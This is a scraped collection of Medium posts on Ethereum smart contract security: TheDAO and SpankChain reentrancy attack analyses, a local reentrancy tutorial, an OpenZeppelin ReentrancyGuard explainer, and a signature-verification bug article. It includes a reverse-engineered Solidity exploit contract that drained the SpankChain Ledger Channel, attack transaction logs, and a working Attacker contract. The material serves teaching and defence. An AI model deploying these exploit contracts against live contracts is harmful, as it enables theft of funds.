25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0x0000000000000000000000000000000000000000For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)From 0xf835a0247b0063c04ef22006ebe57c5f11977cc4To 0xc0ee9db1a9e07ca63e4ff0d5fb6f86bf68d47b89For 25,805.6141471 ($47,833.23)  TheDAO (TheDAO)Value: 138.24322639471464 Ether ($25,601.26)Transaction Fee: 0.071223425 Ether ($13.19)Gas Limit: 4,712,388Gas Used by Transaction: 2,848,937 (60.46%)Gas Price: 0.000000025 Ether (25 Gwei)Nonce Position 8 0After this attack with the light weight venue, the attacker successfully pulls ethers from the DAO contract 29 times.It can also be seen that with maximum number of reentries as 29, the gas consumption is about 60.46% of the limit. So, the maximum number of reentries could be further raised if the attacker would like to.", "responses": 0, "tags": ["Smart Contract", "Reentrancy Attack", "The Dao", "Ethereum", "Dao Attack Source Code"]}, {"title": "Smart Contract Reentrancy: Ledger Channel", "post_link": "https://medium.com/@zhongqiangc/smart-contract-reentrancy-ledger-channel-e894fe647781?source=search_post", "author_name": "Zhongqiang Chen", "author_link": "https://medium.com/@zhongqiangc", "publish_date": "2019-08-22", "last_modified_date": "2019-08-29", "readtime": "7.53", "claps": 0, "voters": 0, "content": "Smart Contract Reentrancy: Ledger ChannelZhongqiang ChenFollowAug 22 \u00b7 8 min readOverview of Ledger ChannelThe Ledger Channel contract (also called payment channel contract) provides a platform for users to create payment channels so that their counter-parties can join the channels and transact through the channels. The payment channel contract was deployed in August 2018 at the address given below.contract address:0xf91546835f756DA0c10cFa0CDA95b15577b84aA7For information on source code and abi of the contract as well as all transactions, please refer to:https://etherscan.io/address/0xf91546835f756da0c10cfa0cda95b15577b84aa7When a channel is created, it can go through a hub or can be established directly between the creator and its counter-party. Information about the hub used for a channel is provided when creating the channel. For instance, by setting the hub to the address of the channel creator, the created channel actually bypasses any hub.For user\u2019s convenience, the payment channel contract also provides a functionality that allows a channel creator to close its channel if the counter-party has not yet joined the channel. Such a functionality seems insignificant and harmless compared to the other complex features such as payment consensus and settlement, it, however, turns out to be an attacking point for malicious users.Vulnerability of Ledger ChannelUsers interact with the payment channel contract through a \u201cledger channel\u201d, which is created by invoking the function createChannel() of the contract. The createChannel() function is defined as follows.contract LedgerChannel {    function createChannel(        bytes32 _lcID,        address _partyI,        uint256 _confirmTime,        address _token,        uint256[2] _balances // [eth, token]    )        public        payable    {        require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");        require(_partyI != 0x0, \"No partyI address provided to LC creation\");        require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");        // Set initial ledger channel state        // Alice must execute this and we assume the initial state        // to be signed from this requirement        // Alternative is to check a sig as in joinChannel        Channels[_lcID].partyAddresses[0] = msg.sender;        Channels[_lcID].partyAddresses[1] = _partyI;        if(_balances[0] != 0) {            require(msg.value == _balances[0], \"Eth balance does not match sent value\");            Channels[_lcID].ethBalances[0] = msg.value;        }        if(_balances[1] != 0) {            Channels[_lcID].token = HumanStandardToken(_token);            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");            Channels[_lcID].erc20Balances[0] = _balances[1];        }        Channels[_lcID].sequence = 0;        Channels[_lcID].confirmTime = _confirmTime;        // is close flag, lc state sequence, number open vc, vc root hash, partyA...        //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);        Channels[_lcID].LCopenTimeout = now + _confirmTime;        Channels[_lcID].initialDeposit = _balances;        emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);    }}When calling the function createChannel(), argument \u201c_token\u201d provided by the caller is treated as the address of a contract that conforms and implements the interfaces defined in HumanStandardToken. The function createChannel() further uses this token\u2019s function transferFrom() to ensure the availability of the tokens specified by the caller (in _balances[1]).After a payment channel has been created, the counter party can join the channel. In case that the counter party has not joined the channel yet, the channel creator can exit the payment channel via the LCOpenTimeout() function, which is given below.contract LedgerChannel {    function LCOpenTimeout(bytes32 _lcID) public {        require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);        require(now > Channels[_lcID].LCopenTimeout);        if(Channels[_lcID].initialDeposit[0] != 0) { Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);        }        if(Channels[_lcID].initialDeposit[1] != 0) {require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");        }        emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);        // only safe to delete since no action was taken on this channel        delete Channels[_lcID];    }}The function LCOpenTimeout() first invokes function transfer() in the channel creator to send back its initial Ether deposit balance, then invokes function transfer() of the token contract provided by the creator in channel creation to send back tokens to the creator. After finishing all transfers, the function LCOpenTimeout() deletes the channel.Clearly, the LCOpenTimeout() function only deletes the on-chain channel data, which zeroes out channel balances, after the token transfer function has been invoked. This allows the malicious contract\u2019s transfer function to call LCOpenTimeout() function in a loop, each time sending the attacker Ethers equivalent to its channel balance.Source code of the attackIn order to exploit the vulnerability of the ledger channel contract, the attacker deployed two malicious contracts. The addresses of the two contracts are given below.addresses of malicious contracts:0xc5918a927C4FB83FE99E30d6F66707F4b396900E0xaaaD8d7AE50d5dd6fFA9d29A2531ab2a67803A1fcontract creator:0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199for information on contract binary code and all transactions, please refer tohttps://etherscan.io/address/0xc5918a927c4fb83fe99e30d6f66707f4b396900ehttps://etherscan.io/address/0xaaad8d7ae50d5dd6ffa9d29a2531ab2a67803a1fBy looking at information about these two contracts, we can only find their binary codes, no source code or application binary interfaces (ABIs) of the contracts is available.If we simply compare the binary codes of these two contracts, we know that the contents of the two contracts are different. However, if converting the binary codes of the two contracts into sequences of opcodes, it can be seen that their opcode sequences are exactly the same except the initial value of a variable, which will become clearer later.Based on the binary code of the malicious code, we resort to reverse engineering techniques to restore the code in the form of high level programming language (in this case, Solidity). The source code of the attack obtained through reverse engineering is as follows.pragma solidity ^0.5.1;contract contract_c591 {    // contract address of ledger channel    address constant ledger = 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7;    // owner address    address payable constant owner = 0xcf267eA3f1ebae3C29feA0A3253F94F3122C2199;    // string used to generate ledger channel ID    // c591: \"abc\"    // aaad: \"1chain1\"    bytes constant lcIDBytes = \"abc\";    // bytes constant lcIDBytes = \"1chain1\";    // slot 0x00    uint256 ethAmount = 0;    // slot 0x01    uint256 numReentries = 0;    constructor() public payable {}        function () external payable {}    // function digest: 0x23b872dd    function transferFrom(address _from, address _to, uint256 _val)        public returns (bool) {        require(tx.origin == owner);        return true;    }    // function digest: 0x58f69e07    function exploit(uint256 _numReentries) public payable {        require(tx.origin == owner);        ethAmount = msg.value;        numReentries = _numReentries;        // constant is not allowed in inline assembly        uint256 size;        assembly {            size := extcodesize(0xf91546835f756DA0c10cFa0CDA95b15577b84aA7)        }        require(size != 0);        // function createChannel() digest: 0xaeba142c        (bool success,) = ledger.call.value(msg.value)(            abi.encodeWithSelector(                0xaeba142c,                bytes32(keccak256(lcIDBytes)),                msg.sender,                -block.timestamp,                address(this),                [msg.value, 0x01]            )        );        if (!success) {            revert();        }        // LCOpenTimeout digest: 0x002e1d7e        (success, ) = ledger.call(            abi.encodeWithSelector(                0x002e1d7e, bytes32(keccak256(lcIDBytes))            )        );        if (!success) {            revert();        }        require(address(this).balance > 0);               owner.transfer(address(this).balance);    }    // function digest: 0xa9059cbb    function transfer(address _addr, uint256 _val) public        returns (bool) {        require(tx.origin == owner);        numReentries -= 1;        if ((numReentries > 0) &&            (ledger.balance >= ethAmount)) {            // constant is not allowed in inline assembly            uint256 size;            assembly {                size := extcodesize(0xf91546835f756DA0c10cFa0CDA95b15577b84aA7)            }            require(size != 0);            // LCOpenTimeout digest: 0x002e1d7e            (bool success, ) = ledger.call(abi.encodeWithSelector(                0x002e1d7e, bytes32(keccak256(lcIDBytes))));            /*            if (!success) {                revert();            }            */        }        return true;    }}It is clear from the source code that the attacker first called createChannel to set up the channel, then invoked LCOpenTimeout() function of the victim contract. To form a reentrancy loop, the attack further masqueraded the malicious contract as an ERC20 token to the payment channel contract, and used its transfer() function to call back into the payment channel contract multiple times, draining some Ethers each time.Although the malicious contract masqueraded itself as an ERC20 token, it only implemented the ERC20 interfaces that are absolutely necessary for the attack to be successful. As mentioned previously, the payment contract invokes two functions of the malicious contract: transferFrom() and transfer(), the former is used to ensure the availability of tokens, while the latter is used to return initial deposit balances. Therefore, the malicious contract only implemented these two functions of the ERC20 interfaces.Also, the function transferFrom() is only called once during the channel creation, so this function is not critical to the attack. Thus, this function simply treats every its invocation to be successful.To make it possible to launch multiple attacks at the same time, the malicious code is designed to generate ledger channel identifiers in a \u201crandom\u201d manner. More specifically, an initial phrase (i.e., string) is used as a seed to generate a channel ID via keccak256() function. For instance, the initial phrase is \u201cabc\u201d for the malicious contract with address beginning with C591, while it is \u201c1chain1\u201d for the malicious contract with address starting with AAAD.In order to guarantee the successful execution of function LCOpenTimeout(), all conditions required by the function should be satisfied. One of the conditions is \u201crequire(now > Channels[_lcID].LCopenTimeout)\u201d and Channels[_lcID].LCopenTimeout is set to (now + _confirmTime) during channel creation, where _confirmTime is provided by the channel creator. To make the condition always true, the malicious code sets _confirmTime to (-block.timestamp), which is equivalent to \u201cnow\u201d, rendering that Channels[_lcID].LCopenTimeout = 0.One misconception of reentrancy attack on smart contracts is that fallback function should involve in order to make the attack successful. In this malicious contract, however, the fallback function is empty and does not play any role during the attack. Therefore, reentrancy attack can succeed as long as reentrance point exists and it doesn\u2019t matter whether or not the fallback function is present.Timeline of the attackAfter the malicious contracts have been deployed, the only thing the attacker needs to do is to send transactions to the malicious contracts to invoke the exploit() function.When calling the exploit() function, the attacker can adjust the following parameters: a) maximum number of reentries, b) ether values, and c) gas limit. To maximize the profits of attacks, these parameters should be optimized, which is exactly what the attacker did.First, the attacker launched an attack with a relatively small gas limit (881,764), a small number of reentries (5), and a small amount of ethers (0.1) as shown in attack 1.attack 1:Transaction Hash: 0x84033e0c908cab415359b5a1a54289a533b20b8450836ceb13190848c2aac6a8Status: SuccessBlock: 6467246 1934511 Block ConfirmationsTimestamp: 319 days 18 hrs ago (Oct-07-2018 12:39:09 AM +UTC)From: 0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 (SpankChain Hacker)To: Contract 0xc5918a927c4fb83fe99e30d6f66707f4b396900eTRANSFER  0.1 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xf91546835f756da0c10cfa0cda95b15577b84aa7TRANSFER  0.5 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199Value: 0.1 Ether ($19.45)Transaction Fee: 0.00995411207 Ether ($1.94)Gas Limit: 881,764Gas Used by Transaction: 744,511 (84.43%)Gas Price: 0.00000001337 Ether (13.37 Gwei)Nonce Position 2 33Input Data: 0x58f69e070000000000000000000000000000000000000000000000000000000000000005attack 2:Transaction Hash: 0x21e9d20b57f6ae60dac23466c8395d47f42dc24628e5a31f224567a2b4effa88Status: SuccessBlock: 6467248 1934510 Block ConfirmationsTimestamp: 319 days 18 hrs ago (Oct-07-2018 12:39:30 AM +UTC)From: 0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 (SpankChain Hacker)To: Contract 0xc5918a927c4fb83fe99e30d6f66707f4b396900eTRANSFER  5 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xf91546835f756da0c10cfa0cda95b15577b84aa7TRANSFER  160 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199Value: 5 Ether ($972.45)Transaction Fee: 0.05469104123 Ether ($10.64)Gas Limit: 4,340,996Gas Used by Transaction: 4,090,579 (94.23%)Gas Price: 0.00000001337 Ether (13.37 Gwei)Nonce Position 3 16Input Data: 0x58f69e070000000000000000000000000000000000000000000000000000000000000020attack 3:Transaction Hash: 0xf95e87181d4f0ca831c15e3f401818d06b7c3a281fbccd9544a4669133078099Status: SuccessBlock: 6467258 1934507 Block ConfirmationsTimestamp: 319 days 18 hrs ago (Oct-07-2018 12:41:51 AM +UTC)From: 0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199 (SpankChain Hacker)To: Contract 0xc5918a927c4fb83fe99e30d6f66707f4b396900eTRANSFER  0.5 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xf91546835f756da0c10cfa0cda95b15577b84aa7TRANSFER  7 Ether From 0xc5918a927c4fb83fe99e30d6f66707f4b396900e To  0xcf267ea3f1ebae3c29fea0a3253f94f3122c2199Value: 0.5 Ether ($97.26)Transaction Fee: 0.02494148097 Ether ($4.85)Gas Limit: 2,004,753Gas Used by Transaction: 1,865,481 (93.05%)Gas Price: 0.00000001337 Ether (13.37 Gwei)Nonce Position 4 23Input Data: 0x58f69e070000000000000000000000000000000000000000000000000000000000000017Clearly, the attack is successful, but the return of the attack is small (only 0.1 x 5 = 0.5 Ethers). In this attack, although the number of reentries is low, the gas consumption reaches 84.43% of the limit, indicating that the gas limit is too low and should be increased.So, in attack 2, the attacker changes the gas limit to 4,340,996. Meanwhile, number of reentries and the amount of Ethers also increase to 32 (0x20) and 5 Ethers, respectively. As a result, the attacker gets 160 (32 x 5) Ethers in return. Although the attack succeeded, the gas consumption already reaches 94.23%, quite close to the out-of-gas status.Therefore, the attacker further adjusts the gas limit, amount of Ethers, and number of reentries before launching another attack. The series of attacks launched by the attacker clearly showed the effectiveness and efficiency of the code.ReferencesWe Got Spanked: What We Know So FarWe Got Spanked: What We Know So FarAt 6pm PST Saturday, an unknown attacker drained 165.38 ETH (~$38,000) from our payment channel smart contract which\u2026medium.com2. Transparency ReportTransparency ReportRegarding the SpankChain Hack on October 6th, 2018medium.com", "responses": 0, "tags": ["Reentrancy Attack", "Ledgerchannel Attack", "Smart Contract Reentrancy", "Ethereum", "Reverse Engineering"]}, {"title": "Solidity known attack implementation \u2014 Reentrancy", "post_link": "https://medium.com/@fifiteen82726/solidity-known-attack-implementation-reentrancy-2b22d6bb61b5?source=search_post", "author_name": "Chen-I Chang", "author_link": "https://medium.com/@fifiteen82726", "publish_date": "2019-05-05", "last_modified_date": "2019-05-05", "readtime": "2.10", "claps": 0, "voters": 0, "content": "Solidity known attack implementation \u2014 ReentrancyChen-I ChangFollowMay 5 \u00b7 3 min readIn this post, I am going to go through some solidity known attack and try to reproduce it. The first topic I want to talk about is Reentrancy attack.We will go through the attack concept and introduce our test environment and how to reproduce it.Github Repo:https://github.com/fifiteen82726/Solidity-Reentrancy-AttackReentrancy attackThe fallback mechanism may allow an attacker to re-enter the caller function. This may result in unexpected behaviors, and possibly also in loops of invocations which eventually consume all the gas.Set environmentTruffle (https://truffleframework.com/truffle)Ganache (https://truffleframework.com/ganache)mkdir reentracytruffle initCreate 2 smart contracts with contract folderAttacker.solpragma solidity ^0.4.23;import './Victim.sol';/** * The attack contract does this and that... */contract Attacker {  Victim v;  uint counter;  event LogFallBack(uint c, uint balance);constructor(address a){    v = Victim(a);  }function attack(){    v.withdraw();  }// Fallback function, which is called whenever Attacker receives ether  function() payable{    counter++;    emit LogFallBack(counter, msg.value);    if(counter <10 ){      v.withdraw();    }  }}Victim.solpragma solidity ^0.4.23;/** * The victim contract explores the vulnerable spot */contract Victim {  uint balance = 100;function withdraw() {    require (balance > 0);    uint transferAmt = 1 ether;    // the attack point    msg.sender.call.value(transferAmt)();    // set 0 to prevent user call it again    balance = 0;  }function() payable{}}Migrate to Ganachetruffle migrate --resetAnd you will see our contract is now deployed into the local blockchain.truffle consoleLet\u2019s test our environment and account first.Prepare Victim partaccounts = web3.eth.getAccounts()// Get the account listweb3.eth.getAccounts(function(error, accounts){account1 = accounts[0];});// Get first account addressvictim = await Victim.deployed()victimAddress = victim.address// Store victimgetBalance = web3.eth.getBalanceaccount1_balance = getBalance(account1)a=_// get the promise callback valueaccount1_balance_eth = web3.utils.fromWei(a, 'ether');// get the value in ETH unit// should be or at least close to 99.9865132xxxxgetBalance(victimAddress)// should be 0Ok! Now you\u2019ve already known how to inspect the balance of accounts, and we are going to prepare the attack.First, we need to send ETH to the victim so we can rob it.web3.eth.sendTransaction({from: account1, to: victimAddress, value: web3.utils.toWei('10', 'ether')})getBalance(victimAddress)// -> '10000000000000000000' This command would send 10ETH to the victim contract address.BTW, you might find out that the number is 10000000000000000000 instead of 10. That is because of the smallest unit in solidity is wei instead of ether.10000000000000000000 wei equals to 10 etherAttackSo now that we have our Victim contract and we have eth in that contract, let\u2019s rob it!attacker = await Attacker.deployed()attackerAddress = attacker.addressgetBalance(attackerAddress)// -> '0'attacker.attack()getBalance(victimAddress)// -> '0'!!!getBalance(attackerAddress)// -> '10000000000000000000'As you can see, the victim\u2019s ETH now has gone!", "responses": 0, "tags": ["Ethereum"]}, {"title": "A Look at Open Zeppelin\u2019s ReentrancyGuard", "post_link": "https://medium.com/@cdsudama/a-look-at-open-zeppelins-reentrancyguard-6ff3590d0719?source=search_post", "author_name": "Amal Sudama", "author_link": "https://medium.com/@cdsudama", "publish_date": "2018-07-10", "last_modified_date": "2018-07-11", "readtime": "3.64", "claps": 206, "voters": 13, "content": "A Look at Open Zeppelin\u2019s ReentrancyGuardAmal SudamaFollowJul 10, 2018 \u00b7 4 min readWriting smart contracts is a relatively new practice, and the environment is fraught with danger. The good news is the community\u2019s painful lessons have yielded a set of standards and good practices.Enter Open Zeppelin, an open source battle-tested framework of reusable Ethereum smart contracts. They provide useful contracts that utilize industry standard security patterns that you can leverage in your own contracts. Their solidity repository is also a great resource to learn about these patterns. One such pattern uses a singleton to prevent re-entrant vulnerabilities.Smart contracts are meant to interact with other contracts. As developers we have to expect a malicious contract will attempt to exploit the runtime environment, API and our logic to steal value. One exploit with success in the past invokes a contract method multiple times in a single transaction. If this method transfers value there is a possibility it can be exploited and should be audited.Another way of stating this is a re-entrant vulnerability occurs when a single function appears more than once in the call stack. As functions modify and act on state bad things can happen from seemingly benign code. For a detailed example see the well known DAO $53 million Hack that exploited this vulnerability to steal funds.OpenZeppelin has a ReentrancyGuard contract to mitigate the scenario with a singleton lock to guard function execution. When execution enters a guarded function, the global boolean singleton is inspected and allows the transaction to proceed if it is false, or revert the entire transaction if true. If execution proceeds, the singleton is set to true, ensuring a subsequent re-entrant invocation will fail. The singleton is reset when execution exits the marked function.pragma solidity ^0.4.24;contract ReentrancyGuard {  bool private reentrancyLock = false;  modifier nonReentrant() {    require(!reentrancyLock);    reentrancyLock = true;    _;    reentrancyLock = false;  }}To use this feature a contract inherits from ReentrancyGuard and will get the boolean state variable reentrancyLock and a pre-condition modifier nonReentrant.ReentrancyMockOpen Zeppelin provides a ReentrancyMock contract that simulates three potential types of attacks annotated with comments below:When a function is called recursivelyfunction countLocalRecursive(uint256 n)public nonReentrant // use the lock and proceed, revert on next                    // invocation of nonReentrant guard check{    if (n > 0) {      // do some logic      count();           // make a recursive call, which will trigger      // the lock check resulting in the transaction      // being reverted.      countLocalRecursive(n - 1);    }  }2. When a function uses call to invoke a functionfunction countAndCall(ReentrancyAttack attacker)public nonReentrant   // use the lock and proceed, revert on next                      // invocation of nonReentrant guard check{    count();    // Get a hash of the callback function.    bytes4 func = bytes4(keccak256(\"callback()\"));    // Trust attacker to do something with a known address.    // Of course, the attacker will try to exploit our guarded    // callback in some nefarious scheme and the transaction     // will be reverted.    attacker.callSender(func);  }3. When an external contract multi-dips your functionsfunction countThisRecursive(uint256 n)public nonReentrant   // use the lock and proceed, revert on next                      // invocation of nonReentrant guard check{    if (n > 0) {      count();      // Use low level call mechanism to make a recursive      // invocation, which will trigger the lock check       // resulting in the transaction being reverted.      bool result = address(this).call(abi.encodeWithSignature(\"countThisRecursive(uint256)\", n - 1));      // It is important to `require` this check of the return value      // otherwise the transaction will continue      require(result == true);    }  }PlaygroundI\u2019ve put together a solidity test that uses a modified version of ReentrancyMock to examine the three scenarios above. The modifications add examples of re-entrant vulnerabilities.In solidity we can test for revert occurrences by examining the result of the low-level call invocation. The returned value indicates whether the call execution was successful (true) or unsuccessful (false). To be extra sure we inspect the contract state to ensure it remains unchanged.Before each test, create a new target instance of ReentrancyMock, and set the protected resource (counter) to 2. The test will operate on this target instance.function beforeEach() public {        target = new ReentrancyMock();        // call counter twice to set value to 2        target.callback();        target.callback();    }Verify local reentrant calls are guardedThis test invokes the countLocalRecursive function which tries to recursively invoke itself 10 times. It asserts a failure because the guard forces a revert.function testLocalGuarded() public {    // try to invoke localRecursion that is reentrant.    bool result = address(target).call(abi.encodeWithSignature(\"countLocalRecursive(uint256)\", 10));    // it should detect reentrancy and revert    Assert.isFalse(result, \"Guard should prevent reentry\");    // and the counter is not changed    Assert.equal(target.counter(), 2, \"counter should remain 2\");}Verify local reentrant calls are unguardedThis test invokes the countLocalRecursiveVulnerable function which tries to recursively invoke itself 10 times. After the execution we can see the contract state (counter) was incremented 10 times to be 12 because the function is unguarded.function testLocalVulnerable() public {    // try to invoke localRecursion that is reentrant.    bool result = address(target).call(abi.encodeWithSignature(\"countLocalRecursiveVulnerable(uint256)\", 10));    // it does not detect reentrancy    Assert.isTrue(result, \"Does not have a guard\");    // and the counter got fragged    Assert.equal(target.counter(), 12, \"counter got tickled to 12\");}ConclusionReentrancyGuard is pretty cool and shows how to utilize a singleton to defend against reentrancy and allows us to explore and trace through different scenarios.A consequence of using this global lock pattern is only one guarded function can appear in the call-stack at any time, demonstrated in the testAnotherFunctionVulnerable and testAnotherFunctionGuarded tests.Take the code for a spin! and be sure to checkout Open Zeppelin.Further readingFinding The Greedy, Prodigal, and Suicidal Contracts at ScaleThe hitchhiker\u2019s Guide to Smart Contracts in EthereumMIT Technology Review Business of BlockChainDisclaimerI\u2019m still learning and welcome comments, corrections and improvements.", "responses": 0, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Testing", "Programming"]}, {"title": "Discovering Signature Verification Bugs in Ethereum Smart Contracts", "post_link": "https://media.consensys.net/discovering-signature-verification-bugs-in-ethereum-smart-contracts-424a494c6585?source=search_post", "author_name": "Gerhard Wagner", "author_link": "https://media.consensys.net/@gerhard.wagner", "publish_date": "2018-10-11", "last_modified_date": "2018-10-12", "readtime": "7.33", "claps": 249, "voters": 21, "content": "Discovering Signature Verification Bugs in Ethereum Smart ContractsGerhard WagnerFollowOct 11, 2018 \u00b7 8 min readReentrancy or Integer Overflows are security issues in smart contracts that most developers are aware of or at least have heard about. Attacks on cryptographic signature implementations on the other hand do not immediately come to mind when you think about smart contract security. They are typically associated with network protocols. For example signature replay attacks, a malicious user eavesdrops a protocol sequence containing a valid signature and replays it against a target to gain an advantage.This article will explain two types of weaknesses that can occur in smart contracts which process DApp-generated signatures. We will be looking into concrete real world examples from audits that were done by the Diligence team earlier this year. Further we will discuss how smart contracts can be designed to avoid these kinds vulnerabilities.The Protocol LayerSignatures are essential cryptographic building blocks in the Ethereum network. Every transaction that is sent to the network must have a valid signature. The figure below shows an example for such a transaction. Besides the transaction standard properties such as from, to, gas, value or input that are available in the global namespace and frequently found in smart contract code, the fields v,r and s make up the transaction signature.The Ethereum network ensures that only transactions with valid signatures are included in new blocks. This provides the following security properties for transactions:Authentication: Ethereum nodes use the signature to verify that the transaction signer owns the private key associated with their public address. Developers can therefore trust that msg.sender is authentic.Integrity: The transaction was not altered after it has been signed otherwise the signature is invalid.Non-repudiation: It can\u2019t be disputed that a transaction is signed by the private key belonging to the public address in the from field and that any state changes have been made by the signing party in possession of the private key.The Contract LayerThe protocol layer is not the only place where signatures come into play. More and more they are used in smart contracts themselves. With increasing gas prices and scaling solutions still a work in progress it becomes increasingly important to avoid on-chain transactions. Signatures are very useful when it comes to doing things off-chain. EIP-191 and EIP-712 both specify how to handle signed data in smart contracts. The latter aims to improve the usability of off-chain message signing for use on-chain and a scheme to encode data along with its structure. So why is this useful and how does it save on-chain transactions?Let\u2019s look at a simple example. Alice creates a proposition for Bob that she encodes into a message. She also creates a signature for the message with her private key and sends it to Bob through a channel of their choosing. Bob can verify that Alice signed the message and further on if Bob finds the proposition agreeable he can create a new transaction, include his own message, Alice\u2019s message and signature and send it to a smart contract. With the data the contract can verify that:Bob has signed his own message (or transaction in this case to be more specific). Authentication, integrity and non-repudiation are ensured by the network.Alice has signed the message that Bob sent along in his own message. The smart contract needs to implement the business logic to ensure authentication, integrity and non-repudiation.The whole process only requires a single on-chain transaction which can provide a significantly better user experience and save gas. The caveat is that the smart contract needs to ensure that all three security properties are kept intact for the message that Alice sent to Bob.Let\u2019s analyze two real world examples of signature verification bugs and how they were fixed.Missing Protection against Signature Replay Attacks (SWC-121)The first example was discovered in an audit conducted by Consensys Diligence for Civil, a decentralized marketplace for sustainable journalism. The part of the system that is relevant for this example is called the Newsroom. Content editors can publish articles into the Newsroom and they can also cryptographically sign the content creation, proofing that the content is in fact created by them. The pushRevision() function handles updates or revisions to existing content. The parameters content hash, content URI, timestamp and signature create a new revision for a piece of content. Subsequently verifiyRevisionSignature() is called with the proposed revision and the content author that initially created the first signed revision. According to the design a new revision can only be signed by the author who created the initially signed content version.verifiyRevisionSignature() creates a signed message hash from the content hash that the DApp generated and the address of the Newsroom contract. Then recover() is called which is a function within the ECRecovery library from OpenZeppelin. Subsequently ecrecover() is called and it\u2019s verified if the author actually signed the message. There is no problem with the code of two functions that have been discussed, it\u2019s rather what\u2019s not there that becomes a security issue for the requirement that only authors who initially created content can also create new revisions for it. The contract does not keep track of content hashes. So a content hash and its user signature that have been submitted once can be submitted multiple times. A malicious content author could leverage this issue, take valid signatures and content hashes from another author and create new valid revisions for them without their knowledge.Civil has fixed the issue by tracking content hashes and is rejecting hashes that are already part of a previous revision.Lack of Proper Signature Verification (SWC-122)An instance of this weakness type was discovered in our last audit for 0x. The following explanation is a summary of the issue described in 3.2 of the audit report. The 0x protocol has various signature validators for different signature types including web3 and EIP712. Another validator that exists is called SignatureType.Caller that allows an order to be valid if order.makerAddress equals msg.sender (order.makerAddress is the user that creates an order). If the SignatureType.Caller is set, no actual signature verification is performed for the order by the Exchange contract. It might not be immediately clear why this can lead to a vulnerability since it\u2019s verified that msg.sender and the creator of the order are one and the same, at least that is the assumption.Besides the Exchange contract there is another part of the 0x system called the Forwarder. With this contract, users can simply send ETH and the orders they want to fill and the Forwarder contract executes all orders in a single transaction.Users who want to trade ETH for tokens can send along orders from other users and the Forwarder will make the trades on their behalf. The Exchange contract verifies every single order to ensure that the signatures for the orders are valid and that the other users have actually signed them. Let\u2019s look at the above figure again and reevaluate the assumption that if order.makerAddress equals msg.sender we don\u2019t need to do a proper signature verification in the Exchange contract because the user that sends the transaction is also the maker of the order. If a user sends an order directly to the Exchange contract then that the assumption holds. But what if I send the order through the Forwarder, set order.makerAddress to the Forwarder contract\u2019s address and use the SignatureType.Caller signature validator?The Forwarder calls into the Exchange contract during trade execution to settle individual orders. The Exchange contract verifies each time that the address in order.makerAddress is msg.sender which in this case can be set to the Forwarder address. The order.takerAddress is typically set to the Forwarder address since the contract acts as intermediary between trading parties. So a malicious user can make the Forwarder process orders where the contract trades with itself as it is both the taker and the maker. This works for the following reasons:There is no logic in Forwarder that prevents the contract from being a maker for an order.The ERC20 specs for transferFrom(address _from, address _to, uint256 _value) do not prevent users from doing \u201cempty transfers\u201d. _from and _to can be the same address.The Exchange contract allows an order to be processed based on the fact that the msg.sender has sent it not if the user has actually signed it.The Forwarder will end up with exactly the same balance after the Exchange contract has settled the order and the Forwarder transfers the takerAmount to itself and makerAmount to a malicious user who could have used this scenario to create a \u201cvery favourable order\u201d to obtain all ZRX tokens from the Forwarder in exchange for 1 Wei.To recap, assuming that the sender of a message is also its creator without verifying its signature can be unsafe, in particular if transactions are forwarded through proxies. Proper signature recovery and validation needs to be performed at anytime when contracts process signed messages. 0x promptly fixed the issue by removing the signature validator SignatureType.Caller.TL;DROff-chain message signing is certainly a good way to save on gas and improve user experience. From a security perspective though it definitely adds complexity and makes processing signed messages in smart contracts safely a more challenging task. If you are interested in more examples around signature based attacks or other smart contract weaknesses make sure to check out the SWC-registry Github repo and pages, it has a large collection of vulnerable samples and real world contracts along with more information on the Smart Contract Weakness Classification (SWC) scheme that we have been working on with the community. In case you want to learn more about the SWC or have ideas on how we can make it even better, then come and join the discussion on EIP-1470 at ethereum/EIPs and the Ethereum Magicians.Also feel free to drop by our Discord \ud83d\udc4b and let us know which vulnerabilities you always wanted to have detected by security analysis tools \ud83d\ude4f \u2026 but don\u2019t 